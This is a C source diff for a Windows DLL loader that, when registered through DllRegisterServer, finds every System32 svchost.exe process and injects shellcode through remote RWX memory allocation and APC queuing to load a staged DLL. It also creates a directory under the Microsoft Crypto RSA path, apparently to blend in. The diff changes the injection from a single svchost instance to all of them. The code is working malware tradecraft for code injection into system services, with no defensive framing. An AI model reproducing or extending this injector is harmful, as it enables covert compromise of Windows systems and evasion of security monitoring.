@@ -128,30 +128,40 @@ static void LogMessage(LPCWSTR msg) {
     CloseHandle(hFile);
 }
 
-static DWORD FindProcessPID(LPCSTR name) {
+static DWORD* FindAllProcessPIDs(LPCSTR name, DWORD* pCount) {
+    *pCount = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return 0;
+    if (hSnap == INVALID_HANDLE_VALUE) return NULL;
+
+    DWORD cap = 16, n = 0;
+    DWORD* pids = (DWORD*)HeapAlloc(GetProcessHeap(), 0, cap * sizeof(DWORD));
+    if (!pids) { CloseHandle(hSnap); return NULL; }
+
     PROCESSENTRY32 pe = { sizeof(pe) };
-    DWORD pid = 0;
     if (Process32First(hSnap, &pe)) {
         do {
-            if (lstrcmpiA(pe.szExeFile, name) == 0) {
-                HANDLE hMod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
-                if (hMod != INVALID_HANDLE_VALUE) {
-                    MODULEENTRY32 me = { sizeof(me) };
-                    if (Module32First(hMod, &me)) {
-                        if (strstr(me.szExePath, "System32\\svchost.exe")) {
-                            pid = pe.th32ProcessID;
-                        }
-                    }
-                    CloseHandle(hMod);
-                }
-                if (pid) break;
+            if (lstrcmpiA(pe.szExeFile, name) != 0) continue;
+            HANDLE hMod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
+            if (hMod == INVALID_HANDLE_VALUE) continue;
+            MODULEENTRY32 me = { sizeof(me) };
+            int ok = 0;
+            if (Module32First(hMod, &me)) {
+                if (strstr(me.szExePath, "System32\\svchost.exe")) ok = 1;
             }
+            CloseHandle(hMod);
+            if (!ok) continue;
+            if (n == cap) {
+                cap *= 2;
+                DWORD* np = (DWORD*)HeapReAlloc(GetProcessHeap(), 0, pids, cap * sizeof(DWORD));
+                if (!np) { HeapFree(GetProcessHeap(), 0, pids); CloseHandle(hSnap); return NULL; }
+                pids = np;
+            }
+            pids[n++] = pe.th32ProcessID;
         } while (Process32Next(hSnap, &pe));
     }
     CloseHandle(hSnap);
-    return pid;
+    *pCount = n;
+    return pids;
 }
 
 static LPBYTE BuildAPCShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, DWORD* pdwSize) {
@@ -225,22 +235,14 @@ static LPBYTE BuildAPCShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, DWORD* pd
     return buf;
 }
 
-static BOOL InjectAPC(DWORD pid) {
+static BOOL InjectAPCToProcess(DWORD pid, LPBYTE shellcode, DWORD dwSize) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) { LogMessage(L"[-] InjectAPC: OpenProcess FAILED"); return FALSE; }
 
-    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
-    if (!pLoadLibraryA) { LogMessage(L"[-] InjectAPC: GetProcAddress(LoadLibraryA) FAILED"); CloseHandle(hProcess); return FALSE; }
-
-    DWORD dwSize;
-    LPBYTE shellcode = BuildAPCShellcode(STAGE_DLL_PATH, pLoadLibraryA, &dwSize);
-    if (!shellcode) { LogMessage(L"[-] InjectAPC: BuildAPCShellcode FAILED"); CloseHandle(hProcess); return FALSE; }
-
     LPVOID pRemote = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pRemote) { LogMessage(L"[-] InjectAPC: VirtualAllocEx FAILED"); LocalFree(shellcode); CloseHandle(hProcess); return FALSE; }
+    if (!pRemote) { LogMessage(L"[-] InjectAPC: VirtualAllocEx FAILED"); CloseHandle(hProcess); return FALSE; }
 
     BOOL bWritten = WriteProcessMemory(hProcess, pRemote, shellcode, dwSize, NULL);
-    LocalFree(shellcode);
     if (!bWritten) { LogMessage(L"[-] InjectAPC: WriteProcessMemory FAILED"); VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; }
 
     DWORD threadCount = 0;
@@ -910,26 +912,46 @@ __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
 
     CreateDirectoryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18", NULL);
 
-    DWORD pid = 0;
-    for (int attempt = 0; attempt < 3 && pid == 0; attempt++) {
-        pid = FindProcessPID("svchost.exe");
-        if (pid == 0 && attempt < 2) {
-            wchar_t buf[128];
-            wsprintfW(buf, L"[-] svchost.exe not found (attempt %d/3)", attempt + 1);
-            LogMessage(buf);
-            Sleep(2000);
-        }
+    DWORD pidCount = 0;
+    DWORD* pids = FindAllProcessPIDs("svchost.exe", &pidCount);
+    if (!pids || pidCount == 0) {
+        LogMessage(L"[-] svchost.exe not found in System32");
+        if (pids) HeapFree(GetProcessHeap(), 0, pids);
+        return S_OK;
     }
-    if (pid) {
-        wchar_t buf[256];
-        wsprintfW(buf, L"[+] svchost.exe PID=%lu \xe2\x80\x94 injecting APC", pid);
+
+    wchar_t buf[256];
+    wsprintfW(buf, L"[*] Found %lu svchost instance(s) in System32, injecting into each", pidCount);
+    LogMessage(buf);
+
+    // kernel32.dll has a fixed base address across all processes on a given
+    // Windows boot, so this address is correct for every svchost we inject into.
+    // (No per-target EAT walk needed; would gain nothing on Win10/11.)
+    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
+    if (!pLoadLibraryA) {
+        LogMessage(L"[-] GetProcAddress(LoadLibraryA) FAILED");
+        HeapFree(GetProcessHeap(), 0, pids);
+        return S_OK;
+    }
+
+    DWORD dwSize = 0;
+    LPBYTE shellcode = BuildAPCShellcode(STAGE_DLL_PATH, pLoadLibraryA, &dwSize);
+    if (!shellcode) {
+        LogMessage(L"[-] BuildAPCShellcode FAILED");
+        HeapFree(GetProcessHeap(), 0, pids);
+        return S_OK;
+    }
+
+    int injected = 0;
+    for (DWORD i = 0; i < pidCount; i++) {
+        wsprintfW(buf, L"[+] svchost.exe PID=%lu \xe2\x80\x94 injecting APC", pids[i]);
         LogMessage(buf);
-
-        BOOL ok = InjectAPC(pid);
-        LogMessage(ok ? L"[+] APC injection OK" : L"[-] APC injection FAILED");
-    } else {
-        LogMessage(L"[-] svchost.exe not found after 3 attempts");
+        if (InjectAPCToProcess(pids[i], shellcode, dwSize)) injected++;
     }
+    wsprintfW(buf, L"[+] APC injection attempted on %d/%lu svchost instance(s)", injected, pidCount);
+    LogMessage(buf);
 
+    LocalFree(shellcode);
+    HeapFree(GetProcessHeap(), 0, pids);
     return S_OK;
 }
